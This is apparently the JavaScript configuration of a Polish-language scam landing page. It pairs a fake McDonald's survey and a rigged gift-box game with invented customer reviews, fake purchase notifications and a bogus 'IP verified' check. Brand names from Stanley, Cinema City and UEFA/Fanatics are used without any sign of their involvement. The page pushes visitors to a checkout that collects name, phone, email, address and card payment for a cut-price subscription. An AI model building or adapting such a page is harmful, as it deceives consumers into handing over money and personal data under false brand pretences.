const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "pl";
  const lang = "pl-PL";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Rozmiar: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // WYPEŁNIAM TE INFORMACJE W MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer: "W tym tygodniu możesz zamówić tylko jeden produkt w promocyjnej cenie.",
    text: `
  Gratulacje!<br><br>
  Wziąłeś udział w promocji Stanley: masz szansę zakupić termos STANLEY QUENCHER H2.0 z formą do lodu za jedyne <b>37 zł</b>!
    `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Warszawa, Polska",
      action: "Właśnie otrzymałem biżuterię za 9,99 zł!",
      timeago: "15 sekund temu",
    },
    {
      user: "Carlos B******",
      location: "Kraków, Polska",
      action: "Właśnie otrzymałem biżuterię za 9,99 zł!",
      timeago: "25 sekund temu",
    },
  ];

  const reviewsArr = [
    {
      name: "Marta K.:",
      time: "1 dzień temu",
      header: "To jest niesamowite!",
      product: "26468781",
      review: "Abonament Unlimited to najlepsza inwestycja w moje kino. Dzięki zniżkom do 85% mogłam kupić 6-miesięczny karnet za naprawdę świetną cenę. Polecam!",
    },
    {
      name: "Janek P.:",
      time: "2 dni temu",
      header: "Fantastyczne! Brak mi słów.",
      product: "26468783",
      review: "Kino z abonamentem Unlimited to czysta przyjemność. Zniżki na 6 miesięcy są rewelacyjne, a dostęp do wszystkich seansów to ogromna zaleta. Nie mogę się nacieszyć!",
    },
    {
      name: "Anna S.:",
      time: "2 dni temu",
      header: "Po prostu świetne.",
      product: "26468784",
      review: "Zniżka do 85% na karnet 6-miesięczny? Takie oferty są nie do przebicia! Dzięki Unlimited mogę chodzić do kina kiedy tylko chcę. Super!",
    },
    {
      name: "Krzysztof M.:",
      time: "4 dni temu",
      header: "Uwielbiam to",
      product: "26468781",
      review: "Kupując abonament Unlimited z 85% zniżką, zaoszczędziłem sporo pieniędzy. Teraz mam pełen dostęp do filmów w Cinema City i innych kinach partnerskich. Zdecydowanie warto!",
    },
    {
      name: "Ewa R.:",
      time: "7 dni temu",
      header: "Wow, uwielbiam ten produkt!",
      product: "26468782",
      review: "Oferta 6-miesięcznego abonamentu Unlimited z tak dużą zniżką to prawdziwa okazja. Cieszę się, że mogę oglądać filmy bez ograniczeń. Gorąco polecam wszystkim kinomaniakom!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RECENZJE I OCENY",
    percent: "99%",
    rec: "Komentarze na temat tej promocji",
  };

  const questions = {
    _of: "Pytanie {1} z {2}: ",
    arr: [
      {
        q: "Czy kiedykolwiek zamawiałeś produkty McDonald's?",
        a: [
          "Tak, zamawiam często",
          "Tak, zamawiam rzadko",
          "Nigdy nie zamawiałem",
        ],
      },
      {
        q: "Czy McDonald's powinien kontynuować tego typu kampanie reklamowe?",
        a: ["Tak, absolutnie!", "Tak, ale zmień menu promocyjne", "Nie"],
      },
      {
        q: "Czy poleciłbyś nasze produkty swoim znajomym?",
        a: ["Tak", "Nie"],
      },
    ],
  };

  const check = {
    title: "Twoja odpowiedź jest weryfikowana",
    arr: [
      "Odpowiedziałeś na pytanie 3 z 3",
      "Twój adres IP nie pokazuje wcześniejszych zamówień",
      "Twoja odpowiedź została zweryfikowana",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Dziękujemy za udział w ankiecie!",
        button: "Spróbuj szczęścia",
        text: `
  <center>
      Aby otrzymać promocyjne menu McDonald's, musisz wybrać właściwe pudełko z prezentami.
      <br><br>
      Masz 3 próby, powodzenia!
  </center>
              `,
      },
    },
    first: {
      texts: {
        header: "Och, nie...",
        button: "Spróbuj ponownie",
        text: `
  <center>
      Niestety, ten prezent jest pusty. Masz jeszcze dwie próby, powodzenia!
  </center>
              `,
      },
    },
    win: {
      texts: {
        header: "",
        button: "Złóż zamówienie",
        text: `
  <center>
      <p style="color: #ffffff"></p>
      <br>
      Kliknij przycisk „Złóż zamówienie”, wypełnij formularz i zapłać za zamówienie.
      <br>
      <br>
      W ciągu 3–5 dni otrzymasz przesyłkę z kartą subskrypcji i instrukcjami.
  </center>
              `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informacje osobiste",
      fields: {
        name: {
          enabled: true,
          field: "Imię",
        },
        family: {
          enabled: true,
          field: "Nazwisko",
        },
        phone: {
          enabled: true,
          field: "Numer telefonu",
        },
        email: {
          enabled: true,
          field: "Adres e-mail",
        },
      },
    },
    delivery: {
      title: "Dostawa",
      fields: {
        city: {
          enabled: true,
          field: "Miasto",
        },
        address: {
          enabled: true,
          field: "Adres dostawy",
        },
        zip: {
          enabled: true,
          field: "Kod pocztowy",
        },
      },
    },
    payment: {
      title: "Metody płatności",
      creditCard: "Płatność online kartą kredytową",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Szczegóły zamówienia",
      oldPrice: "304.99 zł",
      newPrice: "43.99 zł",
      size: "Rozmiar",
      subTotal: {
        title: "Suma częściowa",
        amount: "43.99 zł",
      },
      deliveryTime: {
        title: "Czas dostawy",
        amount: "3-5 dni",
      },
      delivery: {
        title: "Dostawa",
        amount: "0,00 zł",
      },
      total: {
        title: "Suma",
        amount: "43.99 zł",
      },
      checkoutButton: "Zapłać za zamówienie",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "CINEMA CITY UNLIMITED - Dostęp do 35 kin - Abonament na 6 miesięcy",
      miniImg: "./src/img/price.png",
      images: ["./src/img/price.png"],
    }
  ];

  const footer = {
    cr: "© 2024, UEFA i Fanatics, Inc.",
  };


  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

const siteKey = "cinepass-fr";

function setCookie(name, value, days = 2) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};


const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};


window.addEventListener("load", () => {
  starupCheck();
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => setCookie("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});